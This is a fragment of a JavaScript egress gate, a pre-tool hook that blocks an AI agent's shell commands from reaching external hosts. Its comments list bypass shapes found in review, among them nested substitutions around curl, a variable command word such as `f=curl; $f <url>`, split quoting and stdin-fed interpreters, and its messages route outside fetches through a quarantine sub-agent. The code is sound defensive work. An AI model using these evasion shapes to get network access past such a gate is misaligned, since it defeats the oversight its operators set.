    for (const sub of inners) { const res = classify(sub, depth + 1, vendorHosts, vendorDomains, inner); if (res.deny) return res }
  } else if (r.frames.length && outer.externalLiteral) {
    // Past the depth limit the inner commands are not read. That was a pass (Viktor LOW, decfb196:
    // five nested $( ... ) around a curl); with an external URL literal in the command it denies.
    return { deny: true, reason: 'subst-too-deep', hosts: [] }
  }
  for (const [k, s] of r.segs.entries()) {
    const mw = r.segWords[k].map((w) => w.text)
    const i = commandWordAt(mw)
    const text0 = segText(s)
    // GHPRPIN: a node span that names gh-pr.mjs passes only in the exact, pinned, stand-alone shape.
    // Read with this command's assignments and loop values expanded: `G=<path>/gh-pr.mjs; node $G` and
    // `for s in <path>/gh-pr.mjs; do node $s; done` name the script too (replay 2026-11-06: the first shape
    // passed unexamined). A value set in an EARLIER Bash call is not visible here (drift control, see above).
    const pinText = [expand(text0, env), ...(loopVariants(text0, env, loops) ?? [])].find((t) => t.includes('gh-pr.mjs'))
    if (pinText !== undefined) {
      const sw = shellWords(pinText)
      const at = commandWordAt(sw)
      if (at < sw.length && NODE_RUNTIME.test(sw[at].split('/').pop())) {
        // Alone: the only simple command of the whole text (a heredoc body, its terminator line and a comment
        // are none), no command or arithmetic frame anywhere, and a text the lexer fully understood.
        const alone = depth === 0 && scope === null && !r.frames.length && r.segs.length === 1 && !r.problems.length
        const why = ghPrPinVerdict(sw, alone)
        if (why) return { deny: true, reason: why, hosts: [] }
      }
    }
    // A shell's -c <string> (and `env -S <line>`) is a command line of its own: judged like a substitution,
    // with this command's assignments and loop values, up to the same depth (see shellCStrings). Before the
    // command-word check: `env -S '<line>'` has no command word of its own (card 74d46cd0).
    const cStrings = shellCStrings(mw)
    const evalText = evalString(mw, i)
    if (evalText !== null) cStrings.push(evalText)
    // Card 772cd001: a command word that is a variable (`f=curl; $f <url>`, `for f in curl; do $f <url>; done`,
    // `f=bash; $f -c '...'`, `f=eval; $f curl <url>`) passed: every rule below read the lexer's word, `$f`. Bash runs the
    // EXPANDED word (split, so `f="curl -s"` runs curl), so each reading (the plain one and every loop reading) is lexed
    // and its own command word judged, here for -c / eval and in the walk below for curl and one-liners. A word that
    // stays unresolved (set in an earlier Bash call, the environment, `read`, a substitution) or a loop reading past
    // the variant limit cannot be read; with an external URL literal in the command it denies (`command-unresolved`).
    const cmdVar = i < mw.length && mw[i].includes('$')
    let plain = null, variants = null, cmdSw = null, cmdUnresolved = false
    if (cmdVar) {
      plain = expand(text0, env, loopOrder(loops))
      variants = loopVariants(text0, env, loops)
      if (variants === null) cmdUnresolved = true
      // Unresolved is judged on the variant readings only (n > 0): in the plain reading a loop variable is still a $NAME
      // (`for f in curl; do $f ...`). There is always at least one variant, with or without a loop, so ANY command word
      // still holding a $ there (`$HOME/bin/x`, `$CURLBIN`, a positional `"$@"`) denies with an external URL literal
      // anywhere in the command (Viktor 43715 INFO 2: a conservative false positive, kept on purpose).
      cmdSw = [plain, ...(variants ?? [])].map((text, n) => {
        const sw = shellWords(text)
        const a = commandWordAt(sw)
        if (a < sw.length) {
          if (n > 0 && sw[a].includes('$')) cmdUnresolved = true
          for (const str of shellCStrings(sw)) if (!cStrings.includes(str)) cStrings.push(str)
          const ev = evalString(sw, a)
          if (ev !== null && !cStrings.includes(ev)) cStrings.push(ev)
        }
        return { sw, a }
      })
    }
    if (cStrings.length && depth < 4) {
      const inner = { env, loops, externalLiteral: outer.externalLiteral }
      for (const str of cStrings) { const res = classify(str, depth + 1, vendorHosts, vendorDomains, inner); if (res.deny) return res }
    } else if (cStrings.length && outer.externalLiteral) {
      return { deny: true, reason: 'shell-c-too-deep', hosts: [] }
    }
    if (i >= mw.length) continue
    if (cmdUnresolved && outer.externalLiteral) return { deny: true, reason: 'command-unresolved', hosts: [] }
    // The program arrives on stdin (heredoc, here-string, or the previous span of a pipe): judge the
    // program text itself, with the same localhost / private / vendor rules as everywhere else.
    // The words are read with this command's assignments expanded: a quoted word is a word now (card
    // fae0712e), and `S=-; python3 "$S" <<'PY'` reads its program from stdin.
    if (stdinFed(mw.map((w) => expand(w, env)), i)) {
      // Read from the text before blanking: a substitution in an unquoted heredoc body is part of the program.
      const parts = [r.cp.slice(s.start, s.end).join(''), ...heredocBodies(r, s)]
      if (pipedFrom(r, k)) {
        const p = r.segs[k - 1]
        parts.push(r.cp.slice(p.start, p.end).join(''), ...heredocBodies(r, p))
      }
      const payload = parts.join('\n')
      const hostsIn = () => [...new Set([...payload.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf))]
        .filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
      if (SHELLS.test(mw[i].split('/').pop())) {
        // A shell fed from stdin: any external URL literal in what it is fed is a deny (fail closed; the
        // body is a program, and recursing into it would re-mask its own heredoc).
        const hs = hostsIn()
        if (hs.length) return { deny: true, reason: 'stdin-shell-external', hosts: hs }
      } else if (NET_PRIMITIVE.test(payload.replace(/\burllib\.parse\b/g, ''))) {
        // `urllib.parse` alone builds or splits URLs and fetches nothing (measured: Radar builds the
        // quarantine-reader's URL list that way); any other network primitive still counts.
        const hs = hostsIn()
        if (hs.length) return { deny: true, reason: 'stdin-interpreter-external', hosts: hs }
      }
    }
    // Every loop reading AND the plain one: a loop variable can share its name with an assignment
    // elsewhere in the command (`for u in <local>; do ...; done; u=<external>; curl "$u"`), and a
    // loop-only reading would let the assigned value go unjudged.
    if (!cmdVar) {
      plain = expand(text0, env, loopOrder(loops))
      variants = loopVariants(text0, env, loops)
    }
    // The two unresolved-destination reserves below read the loop readings' curl argv: noted here from the argv this
    // walk already lexes (card f2a0f976: lexing each reading again per reserve made 64 values x 4 500 curl spans 3x
    // slower, 3.6 s), and applied after the walk, in the order they had (an external host found in ANY reading wins).
    let varUnresolved = false, opUnresolved = false
    for (const [n, text] of [plain, ...(variants ?? [])].entries()) {
      // A variable command word: this reading's own lexed words and command word (772cd001, see above).
      const rd = cmdVar ? cmdSw[n] : null
      const cw = rd ? rd.sw : mw
      const ci = rd ? rd.a : i
      const cmd = (cw[ci] ?? '').split('/').pop()
      let target = null
      if (cmd === 'curl') target = 'curl'
      else if (INTERPRETER.test(cmd) && cw.slice(ci + 1).some((w) => CODE_FLAG.has(w)) && NET_PRIMITIVE.test(text)) target = 'one-liner'
      if (!target) continue
      // curl: the destination is read from the ARGV only. A URL inside a flag VALUE (-d, -e, -H, a
      // JSON payload) is data sent to wherever curl connects, not a destination. The fleet reports PR
      // links with a localhost curl whose -d JSON carries a github.com URL, and scanning the whole text
      // with URL_RE denied exactly that (#1514 re-review, measured on the merged head). An interpreter
      // one-liner has no argv to read, so its code is still scanned with URL_RE.
      let found
      const argv = target === 'curl' ? (rd ? rd.sw : shellWords(text)) : null
      const at = argv ? argv.findIndex((w) => w.split('/').pop() === 'curl') : -1
      if (at !== -1) found = curlDestinations(argv.slice(at + 1))
      else found = [...text.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)
      // A listed vendor host (or a host under a listed domain) passes only by itself: any other
      // destination in the same call still denies.
      const hosts = [...new Set(found)].filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
      if (hosts.length) return { deny: true, reason: `${target}-external`, hosts }
      if (variants === null) return { deny: true, reason: `${target}-loop-unbounded`, hosts: [] }
      if (n > 0 && at !== -1) {
        const args = argv.slice(at + 1)
        if (outer.externalLiteral && !varUnresolved) varUnresolved = curlHasUnresolvedDestination(args, unresolvedHostVar)
        if (!opUnresolved) opUnresolved = curlHasUnresolvedDestination(args, curlOperatorHost)
      }
    }
    // Fail-closed reserve, judged on the loop-expanded readings only (n > 0): in the plain reading a loop
    // variable is still a $NAME, and a loop over local URLs is not an unresolved destination.
    // Card f2a0f976: an operator ${ } left in a destination host denies with no external literal too
    // (curlOperatorHost), on the same readings: every text with no loop variable in it is one loop reading as well.
    // ...and a default form over an unassigned name, read before the defaults are computed (unsetDefaultHost): one more
    // lexing per curl span, not per reading.
    if (!varUnresolved && outer.externalLiteral && mw[i].split('/').pop() === 'curl') {
      const raw = shellWords(text0)
      const at0 = raw.findIndex((w) => w.split('/').pop() === 'curl')
      if (at0 !== -1) varUnresolved = curlHasUnresolvedDestination(raw.slice(at0 + 1), (v) => unsetDefaultHost(v, env, loops))
    }
    if (varUnresolved || opUnresolved) return { deny: true, reason: 'curl-unresolved-destination', hosts: [] }
  }
  // Klodel 42889 (four HIGHs of one class: a lexer misreading left problems, and the allow below let a curl
  // through that bash ran): text the lexer did not fully understand denies when its RAW text (quotes and
  // backslashes off, so c""url counts; comments too, since a misread may have made the URL a comment) holds an
  // external URL literal and a network tool, or an interpreter with a network primitive.
  if (r.problems.length && reserveHit(r.norm, vendorHosts, vendorDomains)) {
    return { deny: true, reason: 'unparseable-external', hosts: [] }
  }
  // Nothing denied. Text the lexer did not fully understand stays an allow, as an unparseable command was
  // before (now judged first on what the lexer read, and past the reserve above).
  return { deny: false, reason: r.problems.length ? 'unparseable' : null, hosts: [] }
}

const GATE_MSG =
  'Kulso halozati hivas Bash-bol TILTVA (egress hard-gate): curl vagy interpreter-egysoros kulso URL-re, ' +
  'akkor is, ha az URL valtozoban van. A localhost/127.0.0.1 hivasok (dashboard) es a helyi halozat ' +
  '(10/8, 172.16/12, 192.168/16, *.local) szabadok. Kulso tartalmat ' +
  'a quarantine-reader sub-ugynokon at kerj le; ha ez egy vendor-API hivas, kerd a fo-agenst.'
// An interpreter program (a heredoc or a one-liner) is judged on its whole text, so a localhost call whose DATA
// carries a link (a PR link in a message, a marabel.hu link in a memory) is denied too; curl reads its destination
// from the argv only. The deny says so, with the shape that passes (3d3307dd replay, cases 6-9: Mira, Pulzus).
const INTERPRETER_HINT =
  ' Ha a cel a localhost dashboard, es a kulso link csak ADAT a szovegben: ird a JSON-t fajlba ' +
  "egyedi nevvel, mert parhuzamos ugynokok osztoznak a /tmp-n (f=$(mktemp); cat > \"$f\" <<'EOF' ... EOF), " +
  'es kuldd curl-lel: curl -s -X POST http://localhost:3420/api/... --data-binary @"$f" ' +
  '(a curl celjat a kapu csak az argv-bol olvassa), vagy scripts/agent-msg.sh.'
const GH_PR_PIN_MSG =
  'scripts/gh-pr.mjs csak a pontos, pinelt alakban futhat (GHPRPIN, Viktor 30388): egyetlen parancs, ' +
  'node <telepites>/scripts/gh-pr.mjs [-C <klon>] <marabel|marveen> <pr|ci> ... -- elotte nincs VAR=, wrapper, ' +
  'node-kapcsolo; nincs ; && | vagy $(...); nem bash -c-ben. Kimenet fajlba: > <fajl>; PR-szoveg: --body-file <fajl> ' +
  "vagy --body-file - <<'EOF'. A fajl sha256-janak egyeznie kell a store/egress-script-pins.json pinjevel; " +
  'uj valtozat = Viktor-atnezes a pontos SHA-ra, utana owner-pin.'
// A command past MAX_COMMAND_CHARS is not read in full (fae0712e h8): the deny says how to split it.
const TOO_LONG_HINT =
  ` A parancs tul hosszu (${MAX_COMMAND_CHARS} karakter folott) a teljes olvasashoz: a nagy szoveget ird fajlba ` +
  '(Write eszkoz), es a parancs csak hivatkozzon ra (--data-binary @fajl), vagy bontsd tobb parancsra.'
export function gateMessage(r) {
  if (/^gh-pr-pin-/.test(r.reason ?? '')) return `${GH_PR_PIN_MSG} (ok: ${r.reason})`
  const hint = /^(?:stdin-interpreter|one-liner)-/.test(r.reason ?? '') ? INTERPRETER_HINT
    : /^command-too-long-/.test(r.reason ?? '') ? TOO_LONG_HINT : ''
  return `${GATE_MSG}${hint} (${r.hosts.length ? `hoszt: ${r.hosts.join(', ')}` : `ok: ${r.reason}`})`
}
function isInvokedDirectly() {
  try { return realpathSync(fileURLToPath(import.meta.url)) === (process.argv[1] ? realpathSync(process.argv[1]) : '') } catch { return false }
}
if (isInvokedDirectly()) {
  let payload
  try { payload = JSON.parse(readFileSync(0, 'utf-8')) } catch { process.exit(0) }
  if (payload?.tool_name !== 'Bash') process.exit(0)
  let r
  try { r = classify(payload?.tool_input?.command, 0, loadVendorHosts(), loadVendorDomains()) } catch (e) { process.stderr.write(`bash-egress-parser: internal error, allowing: ${e?.message}\n`); process.exit(0) }
  if (r.deny) {
    try {
      mkdirSync(dirname(BLOCK_LOG), { recursive: true })
      appendFileSync(BLOCK_LOG, JSON.stringify({ ts: new Date().toISOString(), cwd: process.cwd(), reason: r.reason, hosts: r.hosts }) + '\n')
    } catch { /* the deny still stands; a log failure must not turn it into an allow */ }
    process.stdout.write(JSON.stringify({ hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'deny', permissionDecisionReason: gateMessage(r) } }))
  }
  process.exit(0)
}
